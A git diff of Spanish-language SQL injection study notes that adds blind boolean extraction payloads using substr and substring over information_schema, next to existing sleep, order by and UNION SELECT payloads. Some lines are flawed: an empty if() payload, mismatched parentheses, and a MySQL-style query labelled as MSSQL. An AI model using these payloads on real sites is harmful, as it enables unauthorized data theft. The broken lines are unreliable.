@@ -49,6 +49,7 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 ❯ ' or sleep(5)-- -                                   # Haremos que tarde en responder la web 5 segundos
 ❯ ' and sleep(5)-- -                                  # Haremos que tarde en responder la web 5 segundos
 ❯ ' order by 100-- -                                  # Haremos un ordenamiento con la 100va columna e iremos adivinando hasta que no nos marque un error
+❯ ' and if()-- -
 ```
 
 Después de saber cuantas columnas existen podemos usar Union Select para meter un data en ese columna, esperando a que también esa columna acepte datos. Aquí tendríamos un ejemplo de que existen 3 columnas. Pero pueden ser mas o menos, dependiendo la DB.
@@ -64,6 +65,16 @@ Para saber las bases de datos (DB) existentes.
 ❯ ' union select schema_name from information_schema.schemata-- -                    # Nos muestra todas las bases de datos existentes  
 ❯ ' union select schema_name from information_schema.schemata limit 0,1-- -          # Nos muestra todas las bases de datos existentes, pero limita a 1 resultado, el que varia es el 0 a 1,2,3, etc...
 ❯ ' union select group_concat(schema_name) from information_schema.schemata-- -      # Nos muestra todas las bases de datos existentes, pero separadas por comas
+
+❯ ' and substr((Consulta)Inicio,longitud))=''                                                   # Forma de usar el substr
+	# Longitud = Los caracteres que vamos a extraer
+	# Inicio = Es la posicion inicial del caracter a comparar 
+	# Consulta = Es la peticion que vamos a hacer
+
+❯ ' and substring((select schema_name from information_schema.schemata limit 0,1),1,1)='A'      # Bases MSSQL
+	# Donde 0 indica la primer base de datos y es el valor que ira variando, esto dependiendo de las bases de datos que existan
+	# El segundo '1' es la posicion de la letra en cada palabra y este valor ira variando para ir avanzando a las sig. posiciones de la palabra
+	# 'A' es la letra a la que queremos igualar la consulta 
 ```
 
 Para saber las tablas de la base de datos (DB) especifica.
